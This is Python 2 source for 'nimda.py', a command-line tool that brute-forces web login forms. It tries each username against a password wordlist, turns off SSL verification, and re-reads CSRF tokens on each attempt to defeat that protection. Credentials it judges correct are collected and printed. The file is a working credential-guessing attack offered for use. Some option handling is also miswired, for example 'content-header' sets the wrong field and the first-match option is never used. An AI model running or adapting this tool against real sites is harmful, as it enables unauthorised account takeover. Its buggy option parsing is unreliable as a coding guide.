nimda = """
{}
 mm   m mmmmm  m    m mmmm     mm
 #"m  #   #    ##  ## #   "m   ##
 # #m #   #    # ## # #    #  #  #
 #  # #   #    # "" # #    #  #mm#
 #   ## mm#mm  #    # #mmm"  #    #.py

{} v 1.0 {}
"""
import operator
import requests
import time
import sys
import os

class bcolors:
    HEADER  =   '\033[95m'
    OKBLUE  =   '\033[94m'
    OKGREEN =   '\033[92m'
    WARNING =   '\033[93m'
    FAIL =      '\033[91m'
    ENDC =      '\033[0m'
    BOLD =      '\033[1m'
    UNDERLINE = '\033[4m'



class CliPrint:
    def printLogo(self):
        print nimda.format(bcolors.WARNING,bcolors.FAIL, bcolors.ENDC)

    def headerText(self, this):
        print "Trying combination of username(s) {} with provided passwords from {} file".format(this.usernames, this.passwordsTxt)
        print "Brute-forcing %s" % (this.url)
        print "Delay is  %s milliseconds" % (this.delaySec)

    def errorText(self, text, ext = False):
        print bcolors.FAIL+str(text)+bcolors.ENDC
        sys.exit(0) if ext else None
    
    def infoText(self, text, ext = False):
        print bcolors.OKBLUE+str(text)+bcolors.ENDC+'\n'
        sys.exit(0) if ext else None

    def warnText(self, text, ext = False):
        print bcolors.WARNING+str(text)+bcolors.ENDC+'\n'
        sys.exit(0) if ext else None

    def purpleText(self, text, ext = False):
        print bcolors.HEADER+str(text)+bcolors.ENDC
        sys.exit(0) if ext else None


try:
    from pyquery import PyQuery
except Exception:
    CliPrint().errorText('Error: You don\'t have library pyquery')
    CliPrint().infoText('Please run command:  sudo pip install pyquery', True)

try:
    from time import sleep
except Exception:
    CliPrint().errorText('Error: Probably you don\'t have library time or sleep')
    CliPrint().infoText('Please run command:  sudo pip install time/sleep', True)



class Brute:
    """Main class for BruteForce."""
    def __init__(self):
        self.breakFirstMatch = False
        self.responseHeader = False
        self.responseHtml = False
        self.csrfEnabled = False
        self.progresBar = False
        self.debugging = False
        self.verbose = False
        self.delaySec = 0
        self.statusCode = 0
        self.requestsCounter = 0
        self.correctCredentials = []
        self.startTime = time.time()
        self.csrfSelector = ''
        self.contentText = ''
        self.notContentText = ''
        self.contentHeader = ''
        self.progressDots = ''
        self.notContentHeader = ''
        self.setCookie = ''
        self.usernames = None
        self.url = None
        self.passwordsTxt = None
        self.postJson = dict()
        self.formName = dict()
        self.ses = requests.session()
        self.os = 'win' if os.name == 'nt' else 'lin'

    #Method URL setter
    def setUrl(self, url):
        self.url = url
        return self
    
    #CSRF setter method
    def setCsrf(self, csrf):
        self.formName.update({'csrf':csrf})
        self.csrfEnabled = True
        return self
   
    #usernames setter
    def setUsernames(self, usernames):
        try:
            self.formName.update({'username':usernames.split('=')[0]})
            self.usernames = usernames.split('=')[1].split(',')
        except Exception:
            CliPrint().errorText('Error: username isn\'t specified correctly')
            CliPrint().infoText('syntax: username=\'user=admin,root\'', True)

    #passwords setter method
    def setPasswords(self, passwdTxt):
        try:
            self.formName.update({'password':passwdTxt.split('=')[0]})
            self.passwordsTxt = passwdTxt.split('=')[1]
        except Exception:
            CliPrint().errorText('Error: password isn\'t specified correctly')
            CliPrint().infoText('syntax: password=\'pwd=passwd.txt\'', True)

    #post data setter
    def setPostData(self, pData):
        """ ppdata is without usernames and passwords """
        try:
            pdt = pData.split('&')
            for x in range(0, len(pdt)):
                currel = pdt[x].split('=')
                self.postJson.update({currel[0]:currel[1]})
        except Exception:
            CliPrint().errorText('Error: Can\'t parse post-data')
            CliPrint().infoText('syntax: post-data=\'param1=val1&param2=val2&signin=Sign In\'', True)
            
    # sned empty request to initialize parameters
    def sendEmptyPostRequest(self):
        tmpJson = self.postJson
        tmpJson.update({self.formName['username']:'00000000'})
        tmpJson.update({self.formName['password']:'00000000'})

        if self.csrfEnabled == True:
            self.postJson.update({self.formName['csrf']:'00000000'})

        try:
            firstReq = self.ses.post(self.url, data = tmpJson,verify = False)
        except Exception:
            CliPrint().errorText('Error: Can\'t send 1st request', True)
        return firstReq

    #find CSRF token in response HTML get element and return it
    def getCsrfToken(self, response, selector):
        try:
            pq = PyQuery(response.text)
            tag = pq(selector)
        except Exception:
            CliPrint().errorText('Error: Can\'t parse response HTML document', True)
        return tag

    def checkDefinedVariables(self):
        impVars = [
                    self.url,
                    self.usernames,
                    self.passwordsTxt,
                    [
                        self.contentText,
                        self.notContentText,
                        self.notContentHeader,
                        self.contentHeader
                    ]
                ]
        CliPrint().errorText('url isn\'t defined or defined incorrectly', True) if impVars[0] == None else None
        CliPrint().errorText('username isn\'t defined or defined incorrectly', True) if impVars[1] == None else None
        CliPrint().errorText('password isn\'t defined or defined incorrectly', True) if impVars[2] == None else None
        CliPrint().errorText('content-text or not-content-text or content-header or not-content-header isn\'t defined or defined incorrectly', True) if (impVars[3][0] == impVars[3][1] and impVars[3][2] == impVars[3][3] and impVars[3][0] == '') else None


    def startProccessing(self):
        #check whether important variables are defined or not
        self.checkDefinedVariables()

        # Print header/welcome text
        CliPrint().headerText(self)

        #grab CSRF token value from previous request
        csrf_token = self.getCsrfToken(self.sendEmptyPostRequest(), self.csrfSelector).val()
        
        #get a size of the dictionary
        sizeOfDict = sum(1 for line in open(self.passwordsTxt))
        
        #loop usernames
        for usrnms in self.usernames:
            #open passwords dictionary as _dict variable
            with open(self.passwordsTxt) as _dict:
                #loop _dict array and read value line by line
                for passwd in _dict:
                    #Just count my requests
                    self.requestsCounter+=1
                   
                    #sleep in milliseconds if value is defined by user
                    # otherwise it is 0 by default.
                    #speed of requests depends on network condition
                    #every new request waits response to parse important data like cstf token and then trys to proceed
                    sleep(float(self.delaySec) / 1000) #milliseconds

                    # remove previous csrf value if csrf mode is enabled
                    if self.csrfEnabled == True:
                        del self.postJson[self.formName['csrf']]

                    #delete previous values from formdata list
                    del self.postJson[self.formName['username']]
                    del self.postJson[self.formName['password']]

                    # If csrf mode is enabled then add new key:value in formdata
                    if self.csrfEnabled == True:
                        self.postJson.update({self.formName['csrf'] : csrf_token})

                    #update formdata with new value of username
                    self.postJson.update({self.formName['username'] : usrnms})

                    # remove \n endlines from txt file
                    # and update password value
                    self.postJson.update({self.formName['password'] : passwd.rstrip()})

                    # debugging mode is on then print Post data
                    if self.debugging == True:
                        print self.postJson

                    # try to send request with current session
                    # ignore ssl check
                    try:
                        req = self.ses.post(self.url, data = self.postJson, verify = False)
                    except requests.exceptions.HTTPError as errh:
                        CliPrint().errorText("Http Error :"+errh, True)
                    except requests.exceptions.ConnectionError as errc:
                        CliPrint().errorText("Error Connecting :"+errc, True)
                    except requests.exceptions.Timeout as errt:
                        CliPrint().errorText("Timeout Error :"+errt, True)
                    except requests.exceptions.RequestException as err:
                        CliPrint().errorText("Error: Something happened "+err, True)

                    if self.csrfEnabled == True:
                        csrf_token = self.getCsrfToken(req, self.csrfSelector).val()

                    #spinner. Custom loading gif 
                    if self.verbose != True:
                        os.system('cls') if self.os == 'win' else os.system('clear')
                        mySpinner = '\ '
                        if self.requestsCounter % 4 == 0:
                            mySpinner = '\ '
                        elif self.requestsCounter % 4 == 1:
                            mySpinner = '| '
                        elif self.requestsCounter % 4 == 2:
                            mySpinner = '/ '
                        else:
                            mySpinner = '- '

                    
                    #reset progress-bar 
                    if len(self.progressDots) > 10000:
                        self.progressDots = ''

                    # if not verbose mode the output just correct credentials                   
                    if self.verbose != True:
                        CliPrint().headerText(self)
                        for cr in self.correctCredentials:
                            print ' - '+ cr

                        CliPrint().purpleText("{} : {}".format(usrnms, passwd.rstrip()))
                        CliPrint().purpleText("{} out of {}".format(self.requestsCounter, sizeOfDict*len(self.usernames)))
                        if self.progresBar == True:
                            print "{}".format(self.progressDots)
                        CliPrint().purpleText("{} {} seconds elapsed".format(mySpinner, time.time() - self.startTime))
                    
                    PV = [bcolors.OKGREEN, usrnms, passwd.rstrip(),req.status_code, self.postJson, bcolors.ENDC, bcolors.FAIL]
                    
                    if (int(self.statusCode) == int(req.status_code)) or ((self.contentText != '' and self.contentText in req.text) or (self.notContentText != '' and self.notContentText not in req.text)) or ((self.contentHeader != '' and self.contentHeader in req.text) or (self.notContentHeader != '' and self.notContentHeader not in req.text)):
                        # reset session 
                        self.ses = requests.session()
                        
                        correctValue = None
                        self.progressDots += bcolors.OKGREEN +'*'+bcolors.ENDC
                              
                        if self.verbose:
                            correctValue = "{}Correct! status-code : {}, data: {}{}".format(PV[0],PV[3],PV[4],PV[5])
                        else:
                            correctValue = "{}Correct! {}:{}{}".format(PV[0],PV[1],PV[2],PV[5])

                        #print correct value in specified mode
                        print correctValue
                        #save credentials in the array
                        self.correctCredentials.append(correctValue)
                    else:
                        self.progressDots += bcolors.FAIL +'.'+bcolors.ENDC
                        if self.verbose == True:
                            CliPrint().errorText("{}WRONG!  {}:{}, data: {}{}".format(PV[6],PV[1],PV[2],PV[4],PV[5]))
                    if self.responseHtml == True:
                        CliPrint().warnText("response-HTML: {}".format(req.text.encode('utf-8')))
                    if self.responseHeader == True:
                        CliPrint().warnText("response-header: {}".format(req.headers))


        #print logo in the end
        CliPrint().printLogo() if self.verbose else None

        print "Done in {} seconds".format(time.time() - self.startTime)
        for cr in self.correctCredentials:
            print cr
        if len(self.correctCredentials) == 0:
            CliPrint().errorText('%sSorry we couldn\'t find any matched credentials%s' % (bcolors.FAIL, bcolors.ENDC))

if __name__ == "__main__":
    #print logo
    CliPrint().printLogo()
    #create instance of the main class
    brt = Brute()
    #get all passed variables
    items = sys.argv
    #set exec mode to True if there is at least one variable passed after filename
    execProgram = False if len(items) <= 1 else True
    
    #start looping and parse all passed variables    
    for x in range(1,len(items)):
        usrkey = items[x].split('=', 1)
        # if there is help keyword display help and stop the programm
        if usrkey[0] == 'h' or usrkey[0] == 'help' or usrkey[0] == '-h' or usrkey[0] == '--help':
            #try to open help file otherwise display error message
            try:
                helpFile = open("help", "r")
            except Exception:
                CliPrint().errorText("Couldn't open help file", True)

            with helpFile:
                for line in helpFile:
                    print line
                execProgram = False
            helpFile.close()
            break
        #set values to object variables
        brt.setCsrf(usrkey[1]) if usrkey[0] == 'csrf-token-name' else ''
        brt.setUsernames(usrkey[1]) if usrkey[0] == 'username' else None
        brt.setUrl(usrkey[1]) if usrkey[0] == 'url' else None
        brt.setPasswords(usrkey[1]) if usrkey[0] == 'password' else None
        brt.setPostData(usrkey[1]) if usrkey[0] == 'post-data' else ''
        brt.verbose = True if usrkey[0] == 'verbose' else False
        brt.debugging = True if usrkey[0] == 'debugging' else False
        brt.breakFirstMatch = True if usrkey[0] == 'first-match' else False
        brt.csrfSelector = usrkey[1] if usrkey[0] == 'csrf-selector' else ''
            
        if usrkey[0] == 'content-text':
            brt.contentText = usrkey[1]
        if usrkey[0] == 'not-content-header':
            brt.notContentHeader = usrkey[1]
        if usrkey[0] == 'content-header':
            brt.contentText = usrkey[1]
        if usrkey[0] == 'not-content-text':
            brt.notContentHeader = usrkey[1]
        if usrkey[0] == 'progress-bar':
            brt.progresBar = True
        if usrkey[0] == 'show-response-html':
            brt.responseHtml = True
        if usrkey[0] == 'show-response-header':
            brt.responseHeader = True
        if usrkey[0] == 'status-code':
            brt.statusCode = usrkey[1]
        if usrkey[0] == 'delay':
            brt.delaySec = usrkey[1]

    #if program is in exec mode then execute it
    brt.startProccessing() if execProgram else None
        
